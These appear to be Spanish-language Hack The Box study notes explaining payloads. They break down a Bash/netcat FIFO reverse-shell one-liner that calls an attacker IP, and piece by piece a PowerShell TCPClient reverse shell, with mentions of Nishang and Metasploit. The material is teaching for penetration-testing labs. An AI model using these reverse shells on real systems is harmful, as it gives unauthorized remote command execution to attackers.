
## 1. ¿Qué es un Payload?

Un **payload** es el código, comando o conjunto de instrucciones que queremos ejecutar en un sistema objetivo.

En ciberseguridad, un payload puede utilizarse para:

- Explotar una vulnerabilidad.
- Ejecutar comandos en un sistema remoto.
- Obtener una Reverse Shell o Bind Shell.
- Realizar acciones sobre el sistema comprometido.

Un payload no es necesariamente malware. Simplemente es código que realiza una acción determinada.

**Importante:** El comportamiento del payload depende del sistema operativo, los intérpretes de comandos y los lenguajes de programación disponibles en el objetivo.

## 2. Analizando un One-Liner de Reverse Shell en Linux

Ejemplo de Reverse Shell utilizando Bash, Netcat y una tubería FIFO:

bash

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Este comando permite establecer una shell interactiva de Bash mediante una conexión de red.

### Desglose del comando

**1. Eliminar el archivo anterior**

bash

```
rm -f /tmp/f
```

- `rm`: elimina archivos.
- `-f`: fuerza la eliminación y no muestra errores si el archivo no existe.
- `/tmp/f`: archivo que se utilizará para la comunicación.

**2. Crear una tubería FIFO**

bash

```
mkfifo /tmp/f
```

Crea una tubería con nombre (FIFO) que permite comunicar procesos mediante un flujo de datos.

**3. Redirigir la entrada**

bash

```
cat /tmp/f |
```

Lee los datos de la tubería FIFO y los envía al siguiente comando mediante `|`.

**4. Ejecutar Bash en modo interactivo**

bash

```
/bin/bash -i 2>&1 |
```

- `/bin/bash`: ejecuta Bash.
- `-i`: inicia una shell interactiva.
- `2>&1`: redirige los errores estándar (STDERR) hacia la salida estándar (STDOUT).
- `|`: conecta la salida con el siguiente comando.

**5. Establecer la conexión con Netcat**

bash

```
nc 10.10.14.12 7777 > /tmp/f
```

- `nc`: ejecuta Netcat.
- `10.10.14.12`: dirección IP del atacante.
- `7777`: puerto del listener.
- `>`: redirige la salida hacia `/tmp/f`.

### Operadores importantes de Linux

|Operador|Función|
|---|---|
|`;`|Ejecuta comandos secuencialmente.|
|`\|`|Conecta la salida de un comando con la entrada de otro.|
|`>`|Redirige la salida estándar.|
|`2>&1`|Redirige STDERR hacia STDOUT.|
|`-f`|Fuerza una operación.|
|`-i`|Activa el modo interactivo de Bash.|

## 3. Analizando un One-Liner de PowerShell

En Windows podemos utilizar PowerShell para establecer comunicaciones TCP y ejecutar comandos.

El payload utilizado en la sección anterior tiene diferentes componentes que debemos comprender.

### 3.1. Ejecutar PowerShell

powershell

```
powershell -nop -c
```

- `powershell`: ejecuta PowerShell.
- `-nop`: evita cargar el perfil de PowerShell (`-NoProfile`).
- `-c`: ejecuta el comando o bloque de código proporcionado.

### 3.2. Crear un socket TCP

powershell

```
$client = New-Object System.Net.Sockets.TCPClient('IP', PUERTO);
```

- `New-Object`: crea un objeto.
- `System.Net.Sockets.TCPClient`: clase de .NET que permite establecer conexiones TCP.
- `$client`: variable que almacena el objeto de conexión.
- IP y puerto: identifican el destino de la conexión.

### 3.3. Obtener el flujo de comunicación

powershell

```
$stream = $client.GetStream();
```

`GetStream()` obtiene el flujo de datos asociado a la conexión TCP.

Permite enviar y recibir información.

### 3.4. Crear un buffer de bytes

powershell

```
[byte[]]$bytes = 0..65535|%{0};
```

- `[byte[]]`: define un array de bytes.
- `0..65535`: genera un rango de valores.
- `%`: alias de `ForEach-Object`.
- `{0}`: genera ceros para rellenar el buffer.

Se utiliza como espacio temporal para recibir datos.

### 3.5. Leer los datos recibidos

powershell

```
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Inicia un bucle `while` que continúa mientras se reciban datos.

Parámetros de `Read()`:

- `$bytes`: buffer donde se almacenan los datos.
- `0`: posición inicial.
- `$bytes.Length`: cantidad máxima de bytes que se pueden leer.

La variable `$i` almacena el número de bytes recibidos.

### 3.6. Convertir bytes a texto

powershell

```
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
```

Convierte los bytes recibidos en una cadena de texto utilizando codificación ASCII.

### 3.7. Ejecutar comandos

powershell

```
$sendback = (iex $data 2>&1 | Out-String);
```

- `iex`: alias de `Invoke-Expression`.
- Ejecuta el contenido de `$data` como una expresión de PowerShell.
- `2>&1`: combina errores y salida estándar.
- `Out-String`: convierte los resultados en texto.

**Importante:** `Invoke-Expression` ejecuta código recibido dinámicamente, por lo que representa un comportamiento especialmente sensible desde el punto de vista de la seguridad.

### 3.8. Construir el prompt

powershell

```
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

Construye el texto que se mostrará como prompt de PowerShell.

- `$sendback`: resultado del comando.
- `PS`: identifica PowerShell.
- `(pwd).Path`: obtiene la ruta del directorio actual.
- `+`: concatena cadenas de texto.

Ejemplo:

text

```
PS C:\Users\htb-student>
```

### 3.9. Convertir la respuesta a bytes

powershell

```
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
```

Convierte la respuesta de texto a un array de bytes utilizando ASCII.

### 3.10. Escribir y enviar los datos

powershell

```
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
```

- `Write()`: escribe los datos en el flujo TCP.
- `Flush()`: fuerza el envío de los datos pendientes.

### 3.11. Cerrar la conexión

powershell

```
$client.Close();
```

Cierra la conexión TCP cuando finaliza la comunicación.

## 4. Nishang: Scripts de PowerShell

**Nishang** es un framework de PowerShell que contiene scripts y herramientas utilizadas en pruebas de penetración.

Entre sus funcionalidades encontramos `Invoke-PowerShellTcp`.

Esta función permite trabajar con dos modalidades:

|Parámetro|Función|
|---|---|
|`-Reverse`|El objetivo inicia una conexión hacia el atacante.|
|`-Bind`|El objetivo escucha en un puerto esperando una conexión.|
|`-IPAddress`|Dirección IP de destino para el modo Reverse.|
|`-Port`|Puerto utilizado para la comunicación.|

### Características importantes del script

- Utiliza clases de .NET para las conexiones TCP.
- Permite gestionar comunicaciones mediante streams.
- Convierte datos entre bytes y texto.
- Ejecuta comandos de PowerShell.
- Gestiona errores mediante bloques `try/catch`.
- Puede mostrar información del usuario y del equipo.
- Permite cerrar correctamente la conexión y el listener.

### Conceptos de PowerShell utilizados

|Elemento|Descripción|
|---|---|
|`function`|Declara una función.|
|`Param()`|Define los parámetros de una función.|
|`[String]`|Define una variable de tipo cadena.|
|`[Int]`|Define una variable de tipo entero.|
|`[Switch]`|Define un parámetro de tipo interruptor.|
|`try`|Ejecuta código que puede generar errores.|
|`catch`|Gestiona errores y excepciones.|
|`$env:username`|Obtiene el nombre del usuario actual.|
|`$env:computername`|Obtiene el nombre del equipo.|
|`Get-Location`|Obtiene el directorio actual.|
|`Invoke-Expression`|Ejecuta una expresión de PowerShell.|

## 5. Los Payloads tienen diferentes formatos

No todos los payloads son iguales. Su estructura depende de diferentes factores:

- Sistema operativo objetivo.
- Intérprete de comandos disponible.
- Lenguajes de programación instalados.
- Herramientas disponibles en el sistema.
- Tipo de vulnerabilidad explotada.
- Método de entrega del payload.

### Tipos de payloads

|Tipo|Descripción|
|---|---|
|One-Liner|Comando de una sola línea que ejecuta una acción.|
|Script|Archivo con código, por ejemplo `.ps1` o `.sh`.|
|Payload generado|Código creado mediante herramientas automatizadas.|
|Payload de Metasploit|Payload generado y gestionado mediante Metasploit.|
|Payload de MSFvenom|Payload creado mediante la herramienta MSFvenom.|

## 6. Metasploit Framework

No siempre es necesario escribir los payloads manualmente.

Existen frameworks que permiten automatizar su generación y entrega.

Uno de los más conocidos es **Metasploit Framework**.

Permite:

- Automatizar diferentes fases de una prueba de penetración.
- Utilizar módulos de explotación.
- Generar y gestionar payloads.
- Establecer sesiones remotas.
- Interactuar con sistemas vulnerables.

En las siguientes secciones de HTB se profundizará en Metasploit y MSFvenom.

## 8. Ideas importantes para el examen HTB

- Un payload es el código o comando que realiza la acción deseada.
- Los payloads dependen del sistema operativo y de las herramientas disponibles.
- En Linux podemos utilizar Bash, Netcat y FIFO para gestionar comunicaciones.
- `mkfifo` crea una tubería con nombre.
- `2>&1` redirige los errores estándar hacia la salida estándar.
- `|` conecta la salida de un comando con la entrada de otro.
- En PowerShell, `TCPClient` permite establecer conexiones TCP.
- `GetStream()` obtiene el flujo de comunicación.
- `Read()` recibe datos y `Write()` envía datos.
- `ASCIIEncoding` permite convertir bytes en texto y viceversa.
- `Invoke-Expression` ejecuta comandos almacenados en una variable.
- Nishang proporciona scripts de PowerShell para pruebas de penetración.
- Metasploit y MSFvenom permiten automatizar la generación y utilización de payloads.

**Idea fundamental:** Un payload es simplemente un conjunto de instrucciones que se ejecutan en un sistema. Comprender cada componente permite entender cómo funciona, detectar comportamientos sospechosos y seleccionar las herramientas adecuadas según el sistema objetivo.
